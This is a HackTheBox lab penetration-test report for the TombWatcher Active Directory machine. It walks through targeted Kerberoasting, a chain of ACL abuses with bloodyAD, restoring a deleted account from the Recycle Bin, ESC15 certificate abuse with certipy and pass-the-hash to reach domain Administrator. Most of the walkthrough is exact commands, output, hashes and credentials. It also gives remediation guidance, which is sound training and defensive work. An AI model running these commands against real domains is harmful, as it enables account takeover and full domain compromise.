# TombWatcher — HackTheBox Report

| Difficulty | OS      | Category         |
| ---------- | ------- | ---------------- |
| Medium     | Windows | Active Directory |

> This report was written for educational and portfolio purposes only. TombWatcher is a retired HackTheBox machine.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope](#scope)
3. [Approach / Methodology](#approach--methodology)
4. [Tools Used](#tools-used)
5. [Assessment Summary (Findings Overview)](#assessment-summary-findings-overview)
6. [Attack Chain Walkthrough](#attack-chain-walkthrough)
7. [Technical Findings Details](#technical-findings-details)
8. [Remediation Summary](#remediation-summary)
9. [Lessons Learned / Skills Demonstrated](#lessons-learned--skills-demonstrated)
10. [Appendix](#appendix)

---

## Executive Summary

**Target:** `DC01.tombwatcher.htb / 10.129.232.167`  
**Platform:** `HackTheBox`  
**Date Completed:** `2026-10-09`  
**Assessment Type:** `Active Directory Penetration Test`  
**Approach:** `Assumed-breach` — testing began with a single set of low-privilege domain credentials (`henry`), consistent with the machine design.

Pheenix Security was engaged to conduct a simulated attack against the HackTheBox TombWatcher environment. This engagement began with a single limited employee account — representing the kind of access an attacker might gain after stealing credentials through a phishing email or a data leak — and tested how far that foothold could be extended.

The results are serious. Starting from that one account, our team achieved complete control of the organization's primary server and every account within it. In a real-world scenario, this would allow an attacker to read, modify, or permanently delete any data on the network, impersonate any employee, issue fraudulent digital identity credentials, and cause significant business disruption — all without physically touching any device.

Four security issues were identified, each enabling the next. They relate to how access permissions are chained across user accounts, how deleted accounts are handled, and how the organization's internal digital certificate system is configured. None require new software to fix — they are correctable through changes to existing settings and access policies.

**Overall Risk Rating: Critical**

---

## Scope

| Host / URL / IP Address    | Description                             |
| -------------------------- | --------------------------------------- |
| DC01.tombwatcher.htb       | Windows Domain Controller (tombwatcher.htb) |
| 10.129.232.167             | Target IP address                       |

Testing was conducted exclusively within the HackTheBox lab environment. No production systems were accessed or impacted.

---

## Approach / Methodology

1. **Reconnaissance** — Identified the target's IP, hostname, and domain via Nmap port scanning. Added the domain and hostname to `/etc/hosts`.
2. **Scanning & Enumeration** — Performed full-port Nmap service enumeration. Ran authenticated BloodHound collection to map all Active Directory objects, group memberships, and ACE relationships.
3. **Vulnerability Analysis** — Analyzed BloodHound output to identify a six-step cascading ACL chain and a certificate template misconfiguration (ESC15 / CVE-2024-49019). Identified an unresolved SID on the WebServer template pointing to a recoverable deleted account in the AD Recycle Bin.
4. **Exploitation** — Used WriteSPN rights on `alfred` to perform a targeted Kerberoast, cracking the service ticket offline to recover `alfred`'s plaintext password.
5. **Privilege Escalation** — Traversed the ACL chain (alfred → INFRASTRUCTURE → ANSIBLE_DEV$ → sam → john), gaining WinRM access as `john`. Restored the deleted `cert_admin` account from the AD Recycle Bin, propagated inherited FullControl via dacledit, and exploited ESC15 to issue a certificate on behalf of the Administrator.
6. **Post-Exploitation** — Authenticated as Administrator using the recovered NT hash, confirmed full domain control, and retrieved both proof flags.

---

## Tools Used

| Tool                     | Purpose                                                       |
| ------------------------ | ------------------------------------------------------------- |
| Nmap                     | Network port and service enumeration                          |
| bloodhound-python        | Authenticated Active Directory data collection                |
| BloodHound               | Attack path analysis and ACE chain visualization              |
| targetedKerberoast.py    | Targeted Kerberoasting via WriteSPN privilege                 |
| hashcat                  | Offline password hash cracking (mode 13100 — Kerberos TGS)   |
| bloodyAD                 | AD object manipulation: group membership, password resets, ownership changes |
| Evil-WinRM               | Remote interactive shell via WinRM (port 5985)                |
| certipy-ad               | AD Certificate Services enumeration and ESC15 exploitation    |
| dacledit.py (Impacket)   | DACL modification — propagating inherited FullControl on OU   |
| PowerShell (Evil-WinRM)  | AD Recycle Bin enumeration and object restoration             |

---

## Assessment Summary (Findings Overview)

| Severity      | Count |
| ------------- | ----- |
| Critical      | 1     |
| High          | 2     |
| Medium        | 1     |
| Low           | 0     |
| Informational | 0     |

| # | Severity | Finding Name |
| - | -------- | ------------ |
| 1 | Critical | ESC15 — WebServer Certificate Template Allows Arbitrary Client Authentication (CVE-2024-49019) |
| 2 | High     | Cascading ACL Abuse Chain Enabling Lateral Movement to Domain Controller |
| 3 | High     | Deleted AD Account Retaining Active Certificate Enrollment Rights |
| 4 | Medium   | Weak Password on Kerberoastable Service Account |

---

## Attack Chain Walkthrough

### 1.1. Reconnaissance

A full-port Nmap scan identified a standard Windows Active Directory domain controller profile. The domain was confirmed as `tombwatcher.htb` and the hostname as `DC01.tombwatcher.htb`.

```bash
sudo nmap -p- 10.129.232.167 -sC -sV -Pn
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-09 13:52 EDT
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-09 21:56:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0.)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
echo "10.129.232.167 dc01.tombwatcher.htb tombwatcher.htb" | sudo tee -a /etc/hosts
```

---

### 1.2. BloodHound Enumeration

Authenticated BloodHound collection was run using the provided `henry` credentials. The data was loaded into BloodHound for attack path analysis.

```bash
bloodhound-python -d tombwatcher.htb -dc dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -ns 10.129.232.167 --dns-tcp --zip
```

BloodHound revealed that `henry` holds **WriteSPN** over `alfred`, enabling a targeted Kerberoasting attack. Further analysis revealed a six-step ACL chain from `alfred` to `john`, who has WinRM access to the DC and GenericAll over the ADCS organizational unit.

![BloodHound — WriteSPN from henry to alfred](./images/Pasted%20image%2020261009140455.png)

---

### 2.1. Targeted Kerberoasting — alfred

Using henry's WriteSPN right, `targetedKerberoast.py` assigned an SPN to `alfred` and immediately requested the Kerberos service ticket in crackable format.

```bash
python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user alfred --dc-ip 10.129.232.167
```

```text
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$d659c61e00a28753c8e263041788df03$7f2b7199c8e95988f2acccfcafadc243f3b41cbbd6c0735b8ebc0ce42fa35f6d1620c1eb7782fd46421c98bd082dfbc684fd3e7fa180e0f8d065244f5af8e549cdf738b2248b872761b592343c1094e9920fa8b4910842b7aedf46aba0cd50d6c892df646d67ed1a991ebe18ad6a56f86a746dacccd60601e248dfa322c3edb3ac9bb23b355a1d89305a994d15c961c48a35f1fa2414a9b998230e5c3706d4986262a39b5852f6fcfb874c786373d20656dab4fbf28198c29b43420ae7bccd35256d61133655c64d26f4656a8747293307915d0f60810f6ddeff2962f85300fd001384e7ed7940f4b8d4d635317e0955401aadc08d2f2907cc60c34ecd0c1cdd00975dcc6b705d24cb8e247eca473cf187d5e4f216b8bca64811d88ce2ea9302ae3522427e035fc870ac020a1d5a31f636e3e80cde09c88cd94242d14c845c15a2526c0839b164149438e13b5de0e55de7f96b2104b2682bd71157aff2914d727d34d576ab7a176eee541999ffbe8f2a474ff88cca0e273329a10d166950fa2edb41f33267748b1924b7637791afce98ce153fd6e8b5288d60c3726f992af21850688fb9d39d3b41aa32bc1d2af5ea8738d3d660107ad2e13c785891e9c217193bfd9cb2f1ecd8f3708771d2846729ecf3cc0bae0c64fb70042b3a003c8cf42c91844bae384d81ac5ffe53b00e56c5905c25ab80dba42554ae3315e5071a8b5a6ecf93ced800996fdbc1feb4c2629875a62a8d293c2b60d08da4ad1d3e254a31d04720a4fc9d55d4f3fe9d448a2d495af701f5b47f75f8ab94e55e90a6fc377dbbcf4ef80cfd26a0b655b460be11f9397c622dfefb80c295660dec908a97ec792da01ae5c1fcd63611aab5f5c8db1eb45937e03b338dc4835d9e113d30c4db04a49ae77b5d4938978d3c3d3cc5648d08665baf73b42968e2df5a5bd83bba82c4b9bbd1a9d0d2fbfa6e94989923ee46f40a48aada9121266bcdb16ac63e2f15f5533a9f8f1683d8689de68240086e6ffc612c9288508f3cbbc23fccae68d4694f689f1ed988aa0426b019a3ef67a4a702853ed4c747dada16be4336efe4781b44f10ff434e23a1d415769ee1cd19e4d55cb20b56178f3d5f8f8ad673fb82fb1d4687f6072fd45382d37460dde27be82c91bb9ac4fafb8d8d3725fcd36447727c678b47c7853e5e8815b4d17995a1a7888fda5a188bf256b7108654d5e0c3bed9f40fb8b46a923ffc4c2e28220a4e55e9263e4036d647b4767b817ef9df223aa5fcdde391711a2897dd666bbacdfd4f69bc605ddb5bc9c9a02605f9a8d9d9bc2c7a722276a2ef11a10f62ccb8be2c6fbf9f08cf184d71cf0f0972c5ff27d064bc70bb4d805c97cb24ab7adcdc2ff87afc29f37908df6cf0c9b5f1e6d266103b16a501f15cd0d6f7906b38927f5ab90c484515a7fcf1b651e9721460bb367a527a425df8851c467efab3ad59acde5e3b5a2edc432b78f
```

The hash was saved and cracked offline:

```bash
hashcat -m 13100 alfred.hash rockyou.txt
```

```text
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$...:basketball

Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Fri Oct  9 18:13:38 2026 (0 secs)
Recovered........: 1/1 (100.00%)
```

Credentials recovered: `alfred : basketball`

---

### 2.2. Lateral Movement — ACL Chain

BloodHound revealed a six-step privilege chain from `alfred` to `john`. Each step leverages an ACE that permits the previous account to manipulate the next.

![BloodHound — alfred AddSelf to INFRASTRUCTURE, INFRASTRUCTURE ReadGMSAPassword on ANSIBLE_DEV$](./images/Pasted%20image%2020261009141553.png)

![BloodHound — ANSIBLE_DEV$ ForceChangePassword on sam](./images/Pasted%20image%2020261009141648.png)

**Step 1 — alfred adds self to INFRASTRUCTURE and reads the gMSA password for ANSIBLE_DEV$:**

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupmember 'INFRASTRUCTURE' 'alfred'

bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
```

```text
[+] alfred added to INFRASTRUCTURE

distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
msDS-ManagedPassword.NT: 8d5363f881f1bb3bff9b0d64b8b76d7a
```

**Step 2 — ANSIBLE_DEV$ resets sam's password via ForceChangePassword:**

![BloodHound — sam WriteOwner on john](./images/Pasted%20image%2020261009143143.png)

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'ANSIBLE_DEV$' -p :8d5363f881f1bb3bff9b0d64b8b76d7a set password sam 'rogue'
```

```text
[+] Password changed successfully!
```

**Step 3 — sam takes ownership of john, grants GenericAll, and resets john's password:**

![BloodHound — sam GenericAll on john via WriteOwner](./images/Pasted%20image%2020261009143354.png)

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' set owner john sam

bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' add genericAll john sam

bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' set password john 'rogue'
```

```text
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
[+] sam has now GenericAll on john
[+] Password changed successfully!
```

---

### 2.3. WinRM Foothold as john / User Flag

![BloodHound — john CanPSRemote to DC01](./images/Pasted%20image%2020261009143753.png)

```bash
evil-winrm -i dc01.tombwatcher.htb -u john -p rogue
```

```text
*Evil-WinRM* PS C:\Users\john\Documents> type c:\users\john\desktop\user.txt
6db5263ad317543ad3ec58f121f859cf
```

---

### 3.1. AD CS Enumeration

BloodHound showed `john` holds **GenericAll** over the `ADCS` OU. Certipy was run to enumerate certificate templates.

![BloodHound — john GenericAll over ADCS OU](./images/Pasted%20image%2020261009144827.png)

```bash
certipy-ad find -target dc01.tombwatcher.htb -u john -p rogue
```

The `WebServer` template contained an unresolved SID in its enrollment rights — `S-1-5-21-1392491010-1358638721-2126982587-1111` — indicating a deleted account still holding active permissions on the template.

```text
  17
    Template Name                       : WebServer
    Enabled                             : True
    Enrollee Supplies Subject           : True
    Schema Version                      : 1
    Extended Key Usage                  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```

---

### 3.2. AD Recycle Bin — cert_admin Discovery

The AD Recycle Bin was queried to identify the object behind the unresolved SID:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted | Where-Object { $_.isDeleted -eq $true }
```

```text
CN                : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-...,CN=Deleted Objects,DC=tombwatcher,DC=htb
ObjectClass       : user
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

The SID matched. The object was queried for additional details:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties *
```

```text
CN              : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
```

The `LastKnownParent` is `OU=ADCS` — the same OU over which `john` holds GenericAll. When an object is restored from the Recycle Bin, it is re-inserted into its `LastKnownParent` container, making this object restorable by `john`.

---

### 3.3. cert_admin Restoration and ESC15 Exploitation

**Step 1 — Restore cert_admin and propagate FullControl:**

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' TOMBWATCHER.HTB/john:'rogue'
```

```text
[*] DACL backed up to dacledit-20261009-191452.bak
[*] DACL modified successfully!
```

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'john' -p 'rogue' set password cert_admin 'rogue'
```

```text
[+] Password changed successfully!
```

**Step 2 — Confirm ESC15 vulnerability as cert_admin:**

```bash
certipy-ad find -dc-host dc01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p 'rogue' -vulnerable -stdout
```

```text
    Template Name                       : WebServer
    Enrollee Supplies Subject           : True
    Schema Version                      : 1
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019.
```

**Step 3 — Request an Enrollment Agent certificate via ESC15:**

```bash
certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'rogue' -dc-ip 10.129.232.167 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.232.167
```

```text
[*] Successfully requested certificate
[*] Saving certificate and private key to 'cert_admin.pfx'
```

**Step 4 — Request a certificate on behalf of Administrator:**

```bash
certipy req -u cert_admin -p 'rogue' -dc-ip 10.129.232.167 -target-ip 10.129.232.167 -ca tombwatcher-CA-1 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
```

```text
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

**Step 5 — Authenticate and retrieve Administrator NT hash:**

```bash
certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
```

```text
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Got TGT
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

---

### 3.4. Domain Administrator Access / Root Flag

```bash
evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> type c:\users\administrator\desktop\root.txt
867c18d8ab873521e3644b0f83ba1320
```

---

## Technical Findings Details

### 1. ESC15 — WebServer Certificate Template Allows Arbitrary Client Authentication — Critical

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-269: Improper Privilege Management |
| **CVSS 3.1 Score** | 9.9 (Critical) — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H |
| **Description (Incl. Root Cause)** | The `WebServer` certificate template is configured with Schema Version 1 and allows the enrollee to supply the subject (`EnrolleeSuppliesSubject`). Schema Version 1 templates do not enforce Application Policy constraints on certificate requests, so an enrollee can inject any Application Policy OID — including the Enrollment Agent OID — into the request regardless of what the template specifies. The `cert_admin` account, once restored from the AD Recycle Bin, held enrollment rights on this template and was used to obtain an Enrollment Agent certificate, then issue a certificate on behalf of the domain Administrator. This vulnerability is tracked as ESC15 / CVE-2024-49019 and was patched by Microsoft in November 2024 (KB5044284). |
| **Security Impact** | Any principal with enrollment rights on this template can impersonate any domain account, including Domain Administrators, without knowing their password. This grants unrestricted access to all systems and data in the domain. |
| **Affected Host(s)** | DC01.tombwatcher.htb — tombwatcher-CA-1 (WebServer template) |
| **Remediation** | - Apply Microsoft patch KB5044284 (November 2024 Patch Tuesday) for your Windows Server version — Audit all Schema Version 1 templates with `EnrolleeSuppliesSubject` enabled; restrict or disable those not operationally required — Remove unresolved SIDs from all certificate template ACLs — Enable CA audit logging and alert on unexpected `on-behalf-of` certificate issuance |
| **References** | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019 — https://attack.mitre.org/techniques/T1649/ — https://cwe.mitre.org/data/definitions/269.html |

**Evidence:**

```text
certipy-ad find -dc-host dc01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p 'rogue' -vulnerable -stdout

    Template Name    : WebServer
    Schema Version   : 1
    [!] Vulnerabilities
      ESC15          : Enrollee supplies subject and schema version is 1.

certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

---

### 2. Cascading ACL Abuse Chain Enabling Lateral Movement to Domain Controller — High

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-732: Incorrect Permission Assignment for Critical Resource |
| **CVSS 3.1 Score** | 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Description (Incl. Root Cause)** | A chain of six misconfigured Active Directory access control entries (ACEs) allowed lateral movement from the initial low-privilege account (`henry`) to an interactive domain controller session (`john`): (1) `henry` holds WriteSPN on `alfred` — enables targeted Kerberoasting; (2) `alfred` holds AddSelf on `INFRASTRUCTURE` — enables self-enrollment; (3) `INFRASTRUCTURE` holds ReadGMSAPassword on `ANSIBLE_DEV$` — exposes the managed service account's NT hash; (4) `ANSIBLE_DEV$` holds ForceChangePassword on `sam` — enables forced password reset; (5) `sam` holds WriteOwner on `john` — allows taking ownership; (6) as owner, `sam` grants itself GenericAll on `john` — enables password reset. The root cause is that these permissions were assigned without consideration of how they compound across multiple accounts, creating an unintended attack path to a privileged user. |
| **Security Impact** | Any attacker who obtains `henry`'s credentials can traverse the full chain to gain an interactive shell on the domain controller as `john`, who additionally has GenericAll over the ADCS OU — enabling further privilege escalation. |
| **Affected Host(s)** | DC01.tombwatcher.htb — accounts: alfred, INFRASTRUCTURE, ANSIBLE_DEV$, sam, john |
| **Remediation** | - Remove WriteSPN from non-administrative accounts; audit all WriteSPN assignments with BloodHound — Restrict AddSelf to groups whose membership confers elevated access; require administrator approval — Audit ReadGMSAPassword delegations and remove those without documented operational justification — Remove ForceChangePassword from service accounts; use fine-grained task delegation instead — Remove WriteOwner and GenericAll from regular user objects; restrict these to administrative tiers only — Implement ongoing BloodHound-based attack path monitoring and quarterly ACE audits |
| **References** | https://attack.mitre.org/techniques/T1078/002/ — https://cwe.mitre.org/data/definitions/732.html — https://bloodhound.readthedocs.io/ |

**Evidence:**

```text
bloodyAD -u alfred -p basketball add groupmember 'INFRASTRUCTURE' 'alfred'
[+] alfred added to INFRASTRUCTURE

bloodyAD -u alfred -p basketball get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
msDS-ManagedPassword.NT: 8d5363f881f1bb3bff9b0d64b8b76d7a

bloodyAD -u 'ANSIBLE_DEV$' -p :8d5363f881f1bb3bff9b0d64b8b76d7a set password sam 'rogue'
[+] Password changed successfully!

bloodyAD -u sam -p rogue set owner john sam
bloodyAD -u sam -p rogue add genericAll john sam
bloodyAD -u sam -p rogue set password john 'rogue'
[+] Password changed successfully!

evil-winrm -i dc01.tombwatcher.htb -u john -p rogue
*Evil-WinRM* PS C:\Users\john\Documents>
```

---

### 3. Deleted AD Account Retaining Active Certificate Enrollment Rights — High

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-281: Improper Preservation of Permissions |
| **CVSS 3.1 Score** | 8.1 (High) — AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H |
| **Description (Incl. Root Cause)** | The `cert_admin` user account was deleted but its SID was not removed from the `WebServer` certificate template's ACL. Active Directory preserves ACEs for deleted objects as unresolved SIDs — the permissions remain active even though the account no longer exists in its original location. With the AD Recycle Bin enabled, `cert_admin` was recoverable. Its `LastKnownParent` attribute pointed to `OU=ADCS`, over which `john` already held GenericAll, meaning `john` could restore the object into that OU and inherit full control over it via dacledit. The root cause is that the account deprovisioning process did not revoke the account's permissions from certificate templates before deletion. |
| **Security Impact** | An attacker with rights over the ADCS OU can restore `cert_admin`, reset its password, and use its active enrollment rights to exploit the ESC15 vulnerability in the `WebServer` template, leading to full domain compromise. This finding directly enables Finding 1. |
| **Affected Host(s)** | DC01.tombwatcher.htb — cert_admin (deleted; SID: S-1-5-21-1392491010-1358638721-2126982587-1111); WebServer certificate template |
| **Remediation** | - Establish a formal deprovisioning workflow that revokes all certificate template ACEs before account deletion — Audit all certificate template ACLs for unresolved SIDs using certipy or native PowerShell; remove any found — Restrict AD Recycle Bin object restoration in sensitive OUs to require multi-party approval and generate a security alert — Periodically review all AD CS template permissions as part of a quarterly access review |
| **References** | https://attack.mitre.org/techniques/T1098/ — https://cwe.mitre.org/data/definitions/281.html |

**Evidence:**

```text
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted

CN        : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid : S-1-5-21-1392491010-1358638721-2126982587-1111
# Matches unresolved SID on WebServer template enrollment ACL

LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' TOMBWATCHER.HTB/john:'rogue'
[*] DACL modified successfully!

bloodyAD -u john -p rogue set password cert_admin 'rogue'
[+] Password changed successfully!
```

---

### 4. Weak Password on Kerberoastable Service Account — Medium

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-521: Weak Password Requirements |
| **CVSS 3.1 Score** | 6.3 (Medium) — AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N |
| **Description (Incl. Root Cause)** | The `alfred` account's Kerberos service ticket was cracked offline in under one second using the `rockyou.txt` wordlist. The plaintext password — `basketball` — is a single common dictionary word with no complexity. The WriteSPN privilege held by `henry` over `alfred` enabled dynamic SPN creation, making `alfred` eligible for Kerberoasting on demand. Kerberos service ticket requests do not trigger account lockouts, meaning offline cracking can proceed without any authentication throttling. |
| **Security Impact** | Any authenticated domain user can request a Kerberos service ticket for an account with an SPN and attempt to crack it offline with no lockout risk. A weak dictionary password allows this to succeed instantly, providing the attacker with valid credentials and initiating the lateral movement chain that ultimately led to full domain compromise. |
| **Affected Host(s)** | DC01.tombwatcher.htb — account: alfred |
| **Remediation** | - Enforce a minimum 25-character random password for all accounts that hold or may be assigned an SPN — Migrate service accounts to Group Managed Service Accounts (gMSA) where possible; gMSA passwords are 240 random characters managed automatically by AD, making offline cracking infeasible — Audit all accounts with SPNs and verify password strength; remove SPNs from accounts that do not require them — Alert on Kerberos TGS-REQ events (Event ID 4769) with unusual volume for a single account |
| **References** | https://attack.mitre.org/techniques/T1558/003/ — https://cwe.mitre.org/data/definitions/521.html — https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview |

**Evidence:**

```text
hashcat -m 13100 alfred.hash rockyou.txt

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$...:basketball

Status...........: Cracked
Time.Started.....: Fri Oct  9 18:13:38 2026 (0 secs)
Recovered........: 1/1 (100.00%)
Candidates.#1....: 123456 -> lovers1
```

---

## Remediation Summary

### Short Term

- Apply Microsoft patch KB5044284 to remediate ESC15 (CVE-2024-49019) on the AD CS server.
- Remove the unresolved `cert_admin` SID from the `WebServer` certificate template ACL.
- Rotate all credentials recovered during this assessment (see Appendix C).
- Reset `alfred`'s password to a minimum 25-character random value, or migrate to a gMSA.

### Medium Term

- Audit all Active Directory ACEs using BloodHound to identify and eliminate attack paths similar to the cascading chain documented in Finding 2. Remove non-essential WriteSPN, AddSelf, ForceChangePassword, WriteOwner, and GenericAll delegations from regular user accounts.
- Implement a formal account deprovisioning procedure that revokes all certificate template and OU permissions before account deletion. Audit existing template ACLs for unresolved SIDs.
- Audit all Schema Version 1 certificate templates with `EnrolleeSuppliesSubject` enabled and restrict or disable those not operationally required.

### Long Term

- Migrate all service accounts to Group Managed Service Accounts (gMSA) to eliminate the Kerberoasting exposure on accounts with SPNs.
- Adopt an Active Directory tiering model to limit the blast radius of any single compromised account; privileged accounts should not be reachable from standard user ACE chains.
- Implement ongoing AD attack path monitoring (BloodHound Enterprise or equivalent) and integrate certificate template ACL reviews into quarterly access review cycles.
- Enable and centralize AD CS audit logging; alert on anomalous certificate requests, unexpected `on-behalf-of` issuance, and restorations from the AD Recycle Bin.

---

## Lessons Learned / Skills Demonstrated

- **Active Directory attack path enumeration with BloodHound** — Mapped a non-obvious six-step ACL chain across multiple account types (user, gMSA, standard accounts) to identify a reachable path from a low-privilege starting point to domain controller access.
- **Targeted Kerberoasting via WriteSPN** — Leveraged a WriteSPN ACE to dynamically assign an SPN and immediately request a crackable TGS ticket without requiring any pre-existing SPN configuration on the target account.
- **gMSA password extraction** — Used group membership (AddSelf) to join the INFRASTRUCTURE group and retrieve the NT hash of the `ANSIBLE_DEV$` gMSA via the `msDS-ManagedPassword` attribute.
- **Cascading ACE abuse (ForceChangePassword / WriteOwner / GenericAll)** — Chained three distinct ACE types across three accounts to escalate from a gMSA hash to an interactive WinRM session on the domain controller.
- **AD Recycle Bin forensics** — Identified a deleted account retaining active permissions on a certificate template by cross-referencing an unresolved SID in the template ACL with objects in the AD Recycle Bin.
- **OU-level permission inheritance via dacledit** — Used GenericAll over an organizational unit to propagate an inherited FullControl ACE down to a restored child object using Impacket's dacledit.
- **ESC15 (CVE-2024-49019) exploitation** — Exploited a Schema Version 1 certificate template with enrollee-supplied subject to inject an Enrollment Agent application policy, obtain an Enrollment Agent certificate, issue a certificate on behalf of the domain Administrator, and authenticate as Administrator using certipy.
- **Pass-the-hash via Evil-WinRM** — Used the Administrator's recovered NT hash to authenticate to the domain controller without knowing the plaintext password.

---

## Appendix

### A. Finding Severity Definitions

| Rating        | Definition |
| ------------- | ---------- |
| Critical      | Exploitation is straightforward and leads directly to full system or domain compromise with minimal prerequisites. |
| High          | Exploitation provides significant access or enables further exploitation with low complexity. |
| Medium        | Exploitation requires additional conditions or access but represents a meaningful security risk. |
| Low           | Limited impact; exploitation is difficult or requires unlikely conditions. |
| Informational | No direct risk; noted for awareness or defense-in-depth improvement. |

---

### B. Exploited Hosts

| Host                  | Method                          | Notes                              |
| --------------------- | ------------------------------- | ---------------------------------- |
| DC01.tombwatcher.htb  | Evil-WinRM (john:rogue)         | User flag recovered                |
| DC01.tombwatcher.htb  | Evil-WinRM pass-the-hash (Administrator) | Root flag recovered; full domain control |

---

### C. Compromised Users / Credentials

| Username       | Method                                        | Notes                                        |
| -------------- | --------------------------------------------- | -------------------------------------------- |
| henry          | Provided (assumed-breach)                     | Starting point                               |
| alfred         | Targeted Kerberoast (hashcat mode 13100)      | Password: basketball                         |
| ANSIBLE_DEV$   | ReadGMSAPassword via INFRASTRUCTURE group     | NT hash: 8d5363f881f1bb3bff9b0d64b8b76d7a   |
| sam            | ForceChangePassword (ANSIBLE_DEV$)            | Password reset to: rogue                     |
| john           | GenericAll password reset (sam via WriteOwner) | Password reset to: rogue                    |
| cert_admin     | GenericAll via dacledit (john / ADCS OU)      | Password reset to: rogue                     |
| Administrator  | ESC15 certificate auth (certipy)              | NT hash: f61db423bebe3328d33af26741afe5fc    |

---

### D. Command Reference Log

